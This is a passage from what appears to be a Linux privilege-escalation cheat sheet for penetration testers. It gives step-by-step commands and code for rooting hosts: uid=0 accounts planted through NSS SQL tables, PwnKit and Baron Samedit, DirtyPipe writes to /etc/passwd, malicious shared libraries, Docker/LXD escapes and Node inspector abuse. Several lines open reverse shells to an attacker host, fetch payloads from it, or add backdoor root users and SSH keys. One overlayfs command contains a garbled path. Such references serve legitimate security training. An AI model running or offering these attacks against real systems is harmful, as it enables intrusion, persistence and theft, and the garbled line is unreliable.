# Or: mkpasswd -m sha-512 P@ssw0rd

# Replace root's hash in /etc/shadow (careful with sed)
# Or simply: su root with the new password
```

### 4.5c NSS SQL Backend (libnss-pgsql / libnss-mysql) — UPDATE on Passwd Table

When `/etc/nsswitch.conf` delegates `passwd`/`group`/`shadow` to a SQL backend (`pgsql`/`mysql`), the database table — not `/etc/passwd` — is the source of truth for Linux account state. UPDATE/INSERT on that table = uid=0 or sudo group membership.

```bash
# Detect: nsswitch points passwd/group/shadow at a SQL backend
grep -E '^(passwd|group|shadow):' /etc/nsswitch.conf
# Look for entries like:  passwd:  files pgsql   /  group: files pgsql   /  shadow: files pgsql

# Locate the backend config — credentials live here
ls -la /etc/libnss-pgsql.conf /etc/libnss-pgsql-root.conf 2>/dev/null
ls -la /etc/libnss-mysql.cfg  /etc/libnss-mysql-root.cfg  2>/dev/null

# Extract DB connection params (host, db, user, password) — readable by anyone in the right group
cat /etc/libnss-pgsql.conf 2>/dev/null
cat /etc/libnss-mysql.cfg  2>/dev/null
```

```bash
# Identify the table NSS reads from — the *_table directives in the config name it
grep -Ei 'passwd_table|shadow_table|group_table|getpwnam|getspnam' /etc/libnss-pgsql.conf 2>/dev/null
grep -Ei 'getpwnam|getspnam|getgrnam'                              /etc/libnss-mysql.cfg  2>/dev/null
```

```bash
# Connect with creds harvested from the config (PostgreSQL)
psql -h <TARGET> -U <USER> -d <INTERNAL_DB>

# Or MySQL/MariaDB
mysql -h <TARGET> -u <USER> -p<PASSWORD> <INTERNAL_DB>
```

```sql
-- Inspect the NSS-backing tables (column names vary; check schema first)
\dt                                              -- psql: list tables
SHOW TABLES;                                     -- mysql

SELECT username, uid, gid, gecos, homedir, shell FROM passwd_table;
SELECT username, passwd FROM shadow_table;
SELECT groupname, gid, members FROM group_table;
```

```bash
# Generate a SHA-512 crypt hash for the new account
openssl passwd -6 -salt <SALT> <PASSWORD>
# or: mkpasswd -m sha-512 <PASSWORD>
```

```sql
-- Path A: insert a uid=0 account directly into the passwd-backing table
INSERT INTO passwd_table (username, uid, gid, gecos, homedir, shell)
VALUES ('<USER>', 0, 0, 'nss-backdoor', '/root', '/bin/bash');

INSERT INTO shadow_table (username, passwd)
VALUES ('<USER>', '<HASH>');
```

```sql
-- Path B: add an existing low-priv user to the sudo group via the group-backing table
UPDATE group_table SET members = '<USER>' WHERE groupname = 'sudo';
-- or, depending on schema:
INSERT INTO group_table (groupname, gid, members) VALUES ('sudo', 27, '<USER>');
```

```bash
# Verify NSS now resolves the new identity (no /etc/passwd write needed)
id <USER>
getent passwd <USER>
getent shadow <USER>
getent group  sudo

# Switch to uid=0 (Path A) or sudo -i (Path B)
su - <USER>
sudo -i
```

> **Tip:** If the DB user from the libnss config has only SELECT, look for a *-root config (`/etc/libnss-pgsql-root.conf`) readable by a higher-priv group — that file holds the write-capable DB credential.

> **Detection:** Any INSERT/UPDATE on the NSS-backing tables. SQL audit logs catch this where filesystem auditing on `/etc/passwd` would miss it entirely.

### 4.6 NFS no_root_squash
```bash
# On attacker (if NFS share has no_root_squash)
sudo mount -t nfs <IP>:/<SHARE> /tmp/nfs -o nolock
cp /bin/bash /tmp/nfs/
sudo chown root:root /tmp/nfs/bash
sudo chmod +s /tmp/nfs/bash

# On target
/path/to/mount/bash -p
```

### 4.7 Kernel & System Exploits — Qualys TRU Arsenal

> **The Qualys Threat Research Unit (TRU) has discovered many of the most impactful Linux privilege escalation vulnerabilities. These are high-priority checks on every engagement.**

```bash
# Check kernel version and OS
uname -r
cat /proc/version
cat /etc/os-release

# Run exploit suggester
./linux-exploit-suggester.sh
```

#### PwnKit — CVE-2021-4034 (Qualys TRU)
**Polkit pkexec SUID root — Almost Universal LPE**
```bash
# Applies when: pkexec is SUID-root AND polkit < patched (most distros pre-Jan 2022; common on lab/exam targets)
# Test cost: ~2s — always run check
# If patched: pkexec exists but exploit fails with "GLib: ... assertion" → polkit ≥0.120; pivot to misconfigured polkit actions (§ later) or Baron Samedit
ls -la /usr/bin/pkexec                                                    # SUID present?
dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null             # version

# Exploit — stage from attacker-hosted SimpleHTTPServer (do NOT pull directly from GitHub raw)
# Attacker (Kali): obtain PwnKit binary locally, then: python3 -m http.server 80
# Host:     curl -fsSL http://<ATTACKER_IP>/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit                                               # 🔴 instant root — auditd execve(pkexec) with empty argv[0] is the canonical CVE-2021-4034 IOC; Falco/Sysdig/CrowdStrike all ship signatures
python3 CVE-2021-4034.py                                                  # no-compile alt
```

#### Baron Samedit — CVE-2021-3156 (Qualys TRU)
**sudo heap-based buffer overflow — No Password Required**
```bash
# Applies when: sudo 1.8.2–1.8.31p2 or 1.9.0–1.9.5p1; offsets distro/libc-specific
# Test cost: ~2s (segfault probe). Run before downloading PoC.
# If patched: probe returns sudoedit usage message instead of segfault → pivot to GTFOBins / sudo -l misconfig
sudo --version
sudoedit -s '\' $(python3 -c 'print("A"*1000)')        # vuln: segfault/error; patched: usage msg

# Distro-specific PoCs (offsets differ — using wrong PoC = segfault, NOT a missing patch):
# 🔴 Baron Samedit fingerprint = auditd sudo invocation with `\` + 1000+ char argv = textbook CVE-2021-3156 alert; pre-segfault probes also visible in auth.log
python3 exploit_nss.py                                  # Debian/Ubuntu (most common)
./exploit_defaults_mailer                               # Ubuntu 20.04 C variant
# If all PoCs segfault: rebuild offsets from target's libc (`ldd /usr/bin/sudo`) before assuming patched
```

#### regreSSHion — CVE-2024-6387 (Qualys TRU)
**OpenSSH sshd Remote Unauthenticated RCE — Signal Handler Race Condition**
```bash
# Applies when: OpenSSH 8.5p1–9.7p1 on glibc; LoginGraceTime default 120s
# ⚠️ Time cost: hours-to-days (thousands of races); 32-bit somewhat practical, 64-bit very hard
# CPTS exam: identify-only — DO NOT attempt full exploitation in a 10-day timebox unless explicitly the path
# If found: note in report, prioritize other vectors first
nc -nv <IP> 22                                          # banner grab
nmap -p 22 -sV <IP>
# Post-compromise check:
cat /etc/ssh/sshd_config | grep -i logingracetime
```

#### Needrestart LPE — CVE-2024-48990 / 48991 / 48992 (Qualys TRU)
**Default on Ubuntu Server — Root via PYTHONPATH / TOCTOU Race**
```bash
# Applies when: needrestart < 3.8 on Ubuntu Server (default-installed); ANY user can wait for trigger
# Test cost: ~2s package check
# If patched: needrestart ≥ 3.8 → no easy alt at the same surface; pivot to PwnKit / Baron Samedit / kernel
dpkg -l needrestart 2>/dev/null
needrestart --version 2>/dev/null

# CVE-2024-48990: PYTHONPATH injection
# needrestart runs with root privileges and improperly sanitizes PYTHONPATH
# when scanning Python processes
# 1. Create malicious Python module
mkdir -p /tmp/evil
cat <<'PYEOF' > /tmp/evil/importlib.py
import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash -p")
PYEOF

# 2. Start a Python process with crafted PYTHONPATH
PYTHONPATH=/tmp/evil python3 -c "import time; time.sleep(3600)" &

# 3. Wait for needrestart to scan (triggered by apt/package operations)
# Or trigger manually if possible: sudo needrestart

# CVE-2024-48991: TOCTOU race condition on Python interpreter path
# needrestart checks interpreter path → attacker replaces it before execution
# Requires precise timing; automated PoCs available

# CVE-2024-48992: Similar to 48990 but via Ruby RUBYLIB environment variable
```

#### PAM + udisks / libblockdev Chain — CVE-2025-6018 / CVE-2025-6019 (Qualys TRU)
**Chained LPE: PAM Environment Spoofing → SUID Mount Abuse**
CVE-2025-6018 affects openSUSE/SUSE; CVE-2025-6019 affects most distros with udisks.
```bash
# Check if udisks2 is installed (almost always on desktop distros)
dpkg -l udisks2 2>/dev/null || rpm -qa udisks2 2>/dev/null
systemctl status udisks2

# CVE-2025-6019 (the udisks/libblockdev part):
# udisks mounts XFS filesystem images for resize without nosuid/nodev
# Attacker provides crafted XFS image with SUID root binary inside
# When mounted for resize → SUID binary becomes accessible → root shell

# Step 1: Create XFS image with SUID binary
dd if=/dev/zero of=/tmp/evil.img bs=1M count=100
mkfs.xfs /tmp/evil.img
mkdir /tmp/xfs_mount
sudo mount /tmp/evil.img /tmp/xfs_mount
# Copy and chmod +s a shell into the XFS image
cp /bin/bash /tmp/xfs_mount/rootshell
chmod u+s /tmp/xfs_mount/rootshell
sudo umount /tmp/xfs_mount

# Step 2: Set up loop device for the image
LOOP=$(losetup --find --show /tmp/evil.img)
echo "[+] Loop device: $LOOP"

# Step 3: Kill gvfs-udisks2-volume-monitor to avoid interference
pkill -f gvfs-udisks2-volume-monitor 2>/dev/null

# Step 4: Trigger resize via udisks2 D-Bus interface (full gdbus call)
# (requires "allow_active" polkit auth — physical console OR CVE-2025-6018)
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/$(basename $LOOP) \
  --method org.freedesktop.UDisks2.Filesystem.Resize \
  209715200 \
  'a{sv} {}'
# udisks mounts the XFS image WITHOUT nosuid → SUID binary is now live

# Step 5: Find the mount point and execute
mount | grep evil.img
MPOINT=$(findmnt -n -o TARGET --source $LOOP)
ls -la "$MPOINT/rootshell"
"$MPOINT/rootshell" -p
# uid=0(root)

# CVE-2025-6018 (PAM spoofing — SUSE/openSUSE specific):
# Create ~/.pam_environment to trick pam_systemd into granting local-console status
cat > ~/.pam_environment <<'PAMEOF'
XDG_SEAT OVERRIDE="seat0"
XDG_VTNR OVERRIDE="1"
PAMEOF
# On next SSH login, pam_env.so reads these → pam_systemd treats session as local
# → polkit grants "allow_active" → D-Bus resize call above succeeds without physical console
```

#### CrackArmor — CVE-2026-23268 / CVE-2026-23269 (Qualys TRU)
**AppArmor Confused Deputy — Bypass Kernel Security, Container Escape**
Nine vulnerabilities in AppArmor LSM. Exists since kernel v4.11 (2017). Affects Ubuntu, Debian, SUSE.
```bash
# Check if AppArmor is in use
aa-status 2>/dev/null
cat /sys/kernel/security/apparmor/profiles 2>/dev/null

# Check kernel version (vulnerable: v4.11+, unpatched)
uname -r

# Exploitation: "Confused Deputy" attack
# 1. Unprivileged user opens AppArmor policy management interfaces
#    /sys/kernel/security/apparmor/.load, .replace, .remove
# 2. Pass the file descriptor to a privileged "deputy" process (sudo, su)
# 3. Privileged process writes attacker-controlled data → loads/removes profiles
# 4. Disable AppArmor protections → escalate via now-unconfined services

# Impact when exploited:
# - Full root LPE (when chained with sudo/su)
# - Container breakout (undermine container isolation)
# - KASLR bypass via out-of-bounds reads
# - DoS via deny-all profiles on critical services

# Mitigation check: verify kernel has patches applied
```

#### Ubuntu Snap LPE — CVE-2026-3888 (Qualys TRU)
**snap-confine + systemd-tmpfiles Race — Default Ubuntu Desktop 24.04+**
```bash
# Check if snapd is installed
snap version 2>/dev/null

# Vulnerable: snapd < 2.75 on Ubuntu Desktop 24.04+
# Also affects Ubuntu 16.04–22.04 LTS with non-default configs

# Exploitation: Timing-based attack chain
# 1. systemd-tmpfiles periodically cleans up stale /tmp directories
# 2. Wait for cleanup of snap-related private /tmp dir (10-30 day window)
# 3. Recreate deleted directory with malicious content
# 4. Trigger snap-confine → executes malicious payload as root

# This is more of a patient/persistent escalation vector
# High complexity but no user interaction required
```

#### OpenSSH Client MitM — CVE-2025-26465 (Qualys TRU)
**SSH Client Host Key Verification Bypass**
Affects OpenSSH client 6.8p1 through 9.9p1 when VerifyHostKeyDNS is enabled.
```bash
# Check SSH client version
ssh -V

# Check if VerifyHostKeyDNS is enabled (usually off by default)
grep -i VerifyHostKeyDNS /etc/ssh/ssh_config ~/.ssh/config 2>/dev/null

# If enabled → client vulnerable to active MitM
# Attacker can impersonate any SSH server
# Useful for: intercepting credentials during pivoting

# FreeBSD historically had this enabled by default
```

#### Classic Kernel Exploits
```bash
# DirtyPipe (CVE-2022-0847) — Linux 5.8 to 5.16.10
# 🔴 alert-likely + persistence-vector write — overwriting /etc/passwd creates a backdoor account = textbook persistence. PER OFFSEC RULES: prefer the read-only proof variant (overwrite a SUID binary's text page in-memory only, restore on reboot) OR target /etc/passwd ONLY in lab; in engagement, pivot to read-shadow proof: dirtypipe /etc/shadow → screenshot first 5 chars + `id` showing the kernel-write primitive, do NOT modify
# Arbitrary file overwrite via pipe splice
./dirtypipe /etc/passwd 1 "hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash"

# DirtyCow (CVE-2016-5195) — Linux 2.6.22 to 4.8.2
# 🔴 alert-likely + persistence-vector write — same /etc/passwd persistence concern as DirtyPipe; loop is intrinsic to the race (not weaponization). Read-only-proof alternative: target /etc/shadow with COW, screenshot the privileged read, do NOT mutate.
# Race condition in copy-on-write mechanism
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password    # Overwrites /etc/passwd with new root user

# GameOver(lay) (CVE-2023-2640 / CVE-2023-32629) — Ubuntu kernels
# OverlayFS privilege escalation
unshare -rm sh -c "mkdir l u w m; cp /u*/b*/p]3telefonbuch l/;
setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m;
touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"bash\")'"

# CVE-2024-1086 (netfilter nf_tables UAF) — Linux 5.14 to 6.6 (excl. 5.15.149+, 6.1.76+, 6.6.15+)
# 99.4% reliability; needs CONFIG_USER_NS=y + kernel.unprivileged_userns_clone=1 + CONFIG_NF_TABLES=y (Debian/Ubuntu defaults)
# https://github.com/Notselwyn/CVE-2024-1086
gcc exploit.c -o exploit && ./exploit                    # ~seconds-to-minutes; deliberate panic post-root
# Won't work on Ubuntu 6.5 (CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y) or hosts on active Wi-Fi (unstable).
```

#### Fragnesia — CVE-2026-46300 (May 2026)
**Deterministic Page-Cache Corruption via XFRM ESP-in-TCP — Root in Seconds**
Corrupts kernel page cache to overwrite files like `/usr/bin/su`. No race condition needed.
```bash
# Check if XFRM modules are loaded (common on systems using IPsec)
lsmod | grep -i 'esp\|xfrm'
cat /proc/net/xfrm_stat 2>/dev/null

# Check kernel version — affects most kernels with CONFIG_INET_ESP enabled
uname -r

# Exploitation: deterministic, public PoC available
# 1. Create an ESP-in-TCP connection using AF_ALG sockets
# 2. Splice operation corrupts page-cache pages
# 3. Overwrite /usr/bin/su with attacker-controlled binary
# 4. Execute → root shell

# Mitigation: update kernel, or disable esp4/esp6 modules if IPsec not needed
modprobe -r esp4 esp6 2>/dev/null
```

#### Dirty Frag — CVE-2026-43284 / CVE-2026-43500 (May 2026)
**ESP/XFRM + RxRPC Page-Cache Corruption — Deterministic Root**
Similar class to Fragnesia; exploits flaws in both ESP and RxRPC subsystems.
```bash
# Check for vulnerable modules
lsmod | grep -i 'rxrpc\|esp'

# Exploitation: public PoC available
# Uses AF_RXRPC socket + zero-copy sendmsg to corrupt page-cache
# Deterministic — no race condition, no brute-force

# Mitigation: update kernel, or disable vulnerable modules
modprobe -r rxrpc esp4 esp6 2>/dev/null
```

#### Copy Fail — CVE-2026-31431 (April 2026)
**algif_aead Crypto Subsystem — Deterministic File Overwrite → Root**
Logic flaw in the kernel's `algif_aead` module allows unprivileged users to overwrite arbitrary files.
```bash
# Check if algif_aead is available
cat /proc/crypto 2>/dev/null | grep -i 'aead'
modprobe algif_aead 2>/dev/null && echo "[!] algif_aead loadable"

# Exploitation: public PoC available
# Uses AF_ALG socket with AEAD algorithm to overwrite /etc/shadow or /usr/bin/su

# Mitigation: update kernel, or blacklist the module
echo "blacklist algif_aead" | sudo tee /etc/modprobe.d/disable-algif.conf
```

> **2026 Kernel LPE trend:** Unlike older exploits (DirtyCow, DirtyPipe) that relied on race conditions, Fragnesia/DirtyFrag/CopyFail are **deterministic** — they succeed on first attempt. Prioritize checking for these on any kernel that hasn't been updated since April 2026.

### 4.8 MySQL/MariaDB UDF Privilege Escalation
```bash
# If MySQL/MariaDB is running as root (or you have MySQL root access):
# Check MySQL user/version
mysql -u root -p -e "SELECT @@version; SELECT user();"

# Check plugin directory
mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
# Usually: /usr/lib/mysql/plugin/ or /usr/lib/x86_64-linux-gnu/mariadb19/plugin/

# Check if you can write to plugin directory
ls -la /usr/lib/mysql/plugin/

# Method 1: Pre-compiled UDF (from sqlmap)
locate lib_mysqludf_sys.so
# Or compile it yourself:
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Load UDF in MySQL
mysql> USE mysql;
mysql> CREATE TABLE foo(line blob);
mysql> INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
mysql> SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
mysql> SELECT do_system('chmod +s /bin/bash');
# Exit → /bin/bash -p → root
```

### 4.9 Python Library Hijacking
```bash
# Check Python module search path
python3 -c "import sys; print('\n'.join(sys.path))"

# If any directory in sys.path is writable by current user:
ls -la $(python3 -c "import sys; print('\n'.join(sys.path))" 2>/dev/null)

# If a script runs as root and imports a module:
# 1. Find the script and its imports
cat /path/to/root_script.py | grep "^import\|^from"

# 2. Create malicious module in a writable path that comes BEFORE the real module
cat <<'EOF' > /writable/path/module_name.py
import os
os.system("chmod +s /bin/bash")
EOF

# 3. Wait for root script to execute (cron, systemd timer, manual)
# Then: /bin/bash -p

# Also check pip installations running as root:
# pip install --user can sometimes be abused if pip is called by root scripts
```

### 4.10 Systemd Timer & Service Abuse

> **🛑 RoE note — this section abuses *existing* systemd units for privesc.** Creating *new* systemd units as a persistence primitive is governed by the §5.2 RoE callout: only fire when the engagement validates persistence, name the unit `engagement-test-<TS>.service`, coordinate with the detection team, remove at end of engagement.

```bash
# Check for writable service files
find /etc/systemd/system/ /lib/systemd/system/ /run/systemd/system/ -writable -type f 2>/dev/null

# Check for writable timer files
find /etc/systemd/system/ /lib/systemd/system/ -name "*.timer" -writable 2>/dev/null

# Check for writable scripts called by services
systemctl list-units --type=service --state=running
systemctl cat <SERVICE_NAME>    # Check ExecStart, ExecStartPre, ExecStop paths
ls -la /path/to/service/binary

# If ExecStart script/binary is writable:
echo '#!/bin/bash' > /path/to/writable_binary
echo 'chmod +s /bin/bash' >> /path/to/writable_binary
# Wait for service restart or: systemctl restart <SERVICE_NAME>

# Check for user-level systemd services that run as root
ls -la ~/.config/systemd/user/ 2>/dev/null
```

### 4.11 Docker Socket / Container Breakout
```bash
# Check if user is in docker group
id | grep docker

# If docker group is listed in id output but not in current session, activate it:
newgrp docker
# Then re-run docker commands — newgrp spawns a new shell with the group active

# Docker group = instant root — spawn NEW container with host filesystem mounted
# IMPORTANT: docker exec into an already-running container gives you nothing new.
# You MUST run a new container with -v /:/mnt to access the host:
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# If the available image has a custom entrypoint (e.g. PHP-FPM, nginx, mysql)
# that overrides your command, override the entrypoint explicitly:
docker run --rm -it --entrypoint sh -v /:/mnt alpine chroot /mnt bash
# Same with any non-distroless image — check `docker images`, then:
docker run --rm -it --entrypoint chroot -v /:/mnt mysql:latest /mnt bash

# Check for writable Docker socket
ls -la /var/run/docker.sock
# If writable (even without docker group membership):
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash

# LXC/LXD — `lxd` group = root via host-fs mount
# Check if user is in lxd group:
id | grep lxd

# If lxd is in /etc/group for your user but not in current `id` output,
# activate it: newgrp lxd  (spawns a new shell with the group active)
newgrp lxd

# If `lxc` errors with "LXD unix socket not found" or "no storage pool found",
# LXD has never been initialized on this host. Run first:
lxd init --minimal

# If host has no images and can't reach the `images:` remote,
# grab rootfs.squashfs + lxd.tar.xz from Canonical, transfer, import. Alpine = ~3MB.
# Browse: https://images.lxd.canonical.com/  → images/alpine/<ver>/amd64/default/<TS>/
# Download both files in your browser, transfer to host, then:
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc -- /bin/sh   # alpine ships /bin/sh, not bash
# Host fs mounted at /mnt/root inside the container:
# cat /mnt/root/root/root.txt

# Container escape from inside container:
# Check: /.dockerenv exists, hostname is random hex, /proc/1/cgroup mentions docker
# If privileged container (capable of mounting host block device):
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # find host disk
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root   # adjust device — sda1/vda1/nvme0n1p1
chroot /tmp/host_root bash
```

### 4.11b Node.js Inspector / Debug Port Privilege Escalation

When a Node.js process runs as root with `--inspect` or `--inspect-brk`, it exposes a **Chrome DevTools Protocol (CDP)** debugger — typically on port 9229. Anyone who can reach that port can execute arbitrary JavaScript as the process owner (root).

```bash
# Detection — look for --inspect in root processes
ps auxf | grep -E 'node.*--inspect'
# Example: root  1412  /usr/bin/node --inspect=127.0.0.1:9229 /opt/app/worker.js

# Also check listening ports for 9229 (default inspector port)
ss -tlnp | grep 9229

# Confirm debugger is active — query the JSON metadata endpoint
curl -s http://127.0.0.1:9229/json
# Returns: [{"id":"<UUID>", "webSocketDebuggerUrl":"ws://127.0.0.1:9229/<UUID>", ...}]
```

**Exploitation — connect and execute code as root:**
```bash
# Method 1: node inspect (simplest — interactive debugger REPL)
node inspect 127.0.0.1:9229
# In the debugger REPL (use single quotes outside, double inside):
# exec('process.mainModule.require("child_process").execSync("id").toString()')
# exec('process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')

# If 'require' is undefined (ES Modules), use process.mainModule:
# exec('process.mainModule.require("child_process").execSync("CMD").toString()')

# Method 2: curl + websocket (scriptable, no interactive session needed)
# Get the UUID first:
UUID=$(curl -s http://127.0.0.1:9229/json | grep -oP '"id":"\K[^"]+' | head -1)
# Then use node to send CDP Runtime.evaluate via WebSocket:
node -e "
var ws = new (require('ws'))('ws://127.0.0.1:9229/$UUID');
ws.on('open', function(){
  ws.send(JSON.stringify({id:1,method:'Runtime.evaluate',
    params:{expression:'process.mainModule.require(\"child_process\").execSync(\"id\").toString()'}}));
});
ws.on('message', function(d){ console.log(d.toString()); process.exit(); });
"
```

**Post-exploitation — get a root shell:**
```bash
# Option A: SUID bash (if filesystem allows suid)
# In debugger: exec('process.mainModule.require("child_process").execSync("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash").toString()')
# Then: /tmp/rootbash -p
# NOTE: may fail on nosuid-mounted filesystems (containers)

# Option B: Add passwordless root user to /etc/passwd
# exec('process.mainModule.require("child_process").execSync("echo pwn::0:0::/root:/bin/bash >> /etc/passwd").toString()')
# Then: su pwn (no password)

# Option C: Reverse shell as root (use exec not execSync — non-blocking)
# exec('process.mainModule.require("child_process").exec("rm -f /tmp/r;mkfifo /tmp/r;cat /tmp/r|sh -i 2>&1|nc <ATTACKER_IP> 9002 >/tmp/r")')

# Option D: Write SSH key for persistent root access
# exec('process.mainModule.require("child_process").execSync("mkdir -p /root/.ssh && echo <PUB_KEY> >> /root/.ssh/authorized_keys").toString()')
```

> **Also check for:** Python debugger (`--pdb`, `pydevd`), Ruby debug (`--debug`, `rdbg`), Java debug (`-agentlib:jdwp`, port 5005/8000), Erlang/Elixir remote shell. Same principle: root-owned process with exposed debug interface = instant root RCE.

### 4.12 Path Hijacking
```bash
# If a script or SUID binary calls a command without full path:
echo '/bin/bash -p' > /tmp/command_name
chmod +x /tmp/command_name
export PATH=/tmp:$PATH
# Run the vulnerable binary
```

### 4.12b Group-Based Privilege Escalation
```bash
# Check group memberships
id
groups

# docker group → instant root (see 4.11)
# lxd/lxc group → instant root (see 4.11)
# NOTE: if group is in /etc/group for your user but not in current `id` output,
# activate it with: newgrp docker  (or newgrp lxd)

# disk group — raw disk read access
# Read any file by accessing the raw block device
debugfs /dev/sda1
# debugfs: cat /etc/shadow
# debugfs: cat /root/.ssh/id_rsa
# debugfs: ls -la /root/
# debugfs: cat /root/proof.txt

# adm group — read log files
# Logs may contain passwords, tokens, or sensitive info
find /var/log -readable -type f 2>/dev/null
grep -ri "password\|pass=\|token\|secret\|key" /var/log/ 2>/dev/null

# systemd-journal group — read all journal logs (modern equivalent of adm)
journalctl 2>/dev/null | grep -i "password\|pass=\|token\|secret"

# video group — access framebuffer (screenshot)
cat /dev/fb0 > /tmp/screenshot.raw
# Convert: ffmpeg -f rawvideo -pix_fmt bgra -s <WIDTH>x<HEIGHT> -i screenshot.raw screenshot.png

# staff group — write to /usr/local (PATH hijacking)
ls -la /usr/local/bin/
# Place malicious binary in /usr/local/bin/ with same name as commonly run command

# shadow group — read /etc/shadow directly
cat /etc/shadow
# Crack hashes: hashcat -m 1800 shadow_hashes.txt wordlist.txt
```

When `id` / `groups` shows a non-standard supplementary group (anything besides docker/lxd/disk/adm/shadow/staff/video/sudo — e.g. `webapp`, `developers`, `appsupport`, `siteadm`, `tomcat`, `git`), pivot to filesystem search to find what that group owns or can write — these are usually app config dirs, log dirs, source trees, or deployment paths.

```bash
# Show all groups the current user is in (including non-standard / app-specific)
id
groups

# For each non-standard group seen above, find files owned by that group
find / -group <GROUP_NAME> 2>/dev/null

# Filter to only files writable by that group (the actual privesc surface)
find / -group <GROUP_NAME> -perm -g=w 2>/dev/null

# Same by GID (useful when the group has no name in /etc/group but shows numeric in id)
find / -gid <GID> 2>/dev/null
find / -gid <GID> -perm -g=w 2>/dev/null

# Common high-value patterns to triage in the output:
# - /etc/<app>/         → config files (DB creds, API keys, service tokens)
# - /var/log/<app>/     → log files (creds in error messages, session tokens)
# - /var/www/<site>/    → web root (drop a webshell if writable)
# - /opt/<app>/         → installed app source / binaries (modify code path)
# - /srv/<app>/         → service data / scripts run by privileged daemon
# - /home/<user>/       → another user's home (SSH keys, .bashrc PATH hijack)
# - /usr/local/bin/     → PATH hijack if root cron/service calls a bare command
```

```bash
# Cross-reference: which processes run as that group (target for PATH / config / log poisoning)
ps -eo user,group,pid,cmd | grep -E "^[^ ]+ +<GROUP_NAME>"

# Which services / units run with that group set
grep -rE "^Group=<GROUP_NAME>" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null

# Which cron jobs run as that group's owning user (config file you write may be re-read)
ls -la /etc/cron.* /var/spool/cron/ 2>/dev/null
```

```bash
# Once a writable group-owned file is found, common wins:
#   1. App config has DB / SMTP / API creds → reuse for lateral / privesc
#   2. App config controls a path executed by root daemon → backdoor that path
#   3. Log file is read by root logrotate/parser → log injection → command exec
#   4. Source file is executed/imported by root cron or service → drop payload
#   5. Init script / service unit / wrapper script is writable → next service restart = root

# Verify the file is truly writable as your effective group (not just owned by it)
ls -la <FOUND_FILE>
test -w <FOUND_FILE> && echo "writable"

# If it's a config consumed by a root process, modify minimally and trigger reload
# (depends on the app — SIGHUP, service restart, scheduled re-read, web request, etc.)
```

### 4.13 Shared Library Hijacking
```bash
# Check for missing shared libraries
strace /path/to/binary 2>&1 | grep "No such file"
ldd /path/to/binary

# If library path is writable:
# Compile malicious .so and place it there
cat <<'EOF' > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /path/to/missing_lib.so /tmp/evil.c
```

### 4.13b ImageMagick `libxcb.so.1` CWD/RPATH Load (CVE-2024-41817)

ImageMagick's `convert` / `identify` / `mogrify` link `libxcb.so.1` with a relative-path / `$ORIGIN`-style RPATH. When invoked from a directory the attacker controls (cron job that `cd`s into a user-owned dir, web upload handler that processes images in an upload temp dir, queue worker that runs out of `/var/spool/...`), the dynamic linker resolves `libxcb.so.1` against the current working directory before the system path. A malicious `libxcb.so.1` dropped in CWD is loaded with attacker code in `__attribute__((constructor))` — fires inside the privileged process.

```bash
# === STEP 1: IDENTIFY THE PRIVILEGED IMAGEMAGICK INVOCATION ===

# Find scheduled / triggered convert|identify|mogrify calls running as another user
grep -RIE "convert|identify|mogrify" /etc/cron* /var/spool/cron 2>/dev/null
systemctl list-timers --all 2>/dev/null
ps -ef | grep -E "convert|identify|mogrify" | grep -v grep

# Look for a service that cd's into a writable dir before invoking IM
# (web upload handlers, queue workers, photo processors)
find /etc/systemd /etc/init.d /opt /var -type f \( -name "*.sh" -o -name "*.service" -o -name "*.py" -o -name "*.php" \) \
  -exec grep -lE "convert|identify|mogrify" {} \; 2>/dev/null

# Confirm the IM binary actually has a relative / $ORIGIN RPATH lookup for libxcb
readelf -d $(which convert) | grep -E "RPATH|RUNPATH|NEEDED"
ldd $(which convert) | grep xcb
# vulnerable signature: RPATH/RUNPATH contains "" / "." / "$ORIGIN" / relative segment
# and libxcb.so.1 resolves via search rather than absolute path
```

```bash
# === STEP 2: CONFIRM CWD CONTROL ===

# Identify the directory IM runs from at execution time
# Option A — strace the running invocation
strace -f -e trace=getcwd,openat -p <PID_OF_IM_PARENT> 2>&1 | grep -E "getcwd|libxcb"

# Option B — instrument the cron script: insert `pwd > /tmp/.imcwd` before the convert call (only if script is writable)
ls -la <SCRIPT_PATH>
# The cwd MUST be attacker-writable for the attack to land
ls -ld <CWD_PATH>
[ -w <CWD_PATH> ] && echo "writable -> exploitable"
```

```bash
# === STEP 3: BUILD MALICIOUS libxcb.so.1 ===

# Constructor fires immediately on dlopen — runs as the user invoking convert/identify
cat > /tmp/xcb.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
static void pwn(void) {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/.rb && chmod +s /tmp/.rb");
    // Or: system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' &");
}
EOF

# Compile with the SONAME the linker will look up
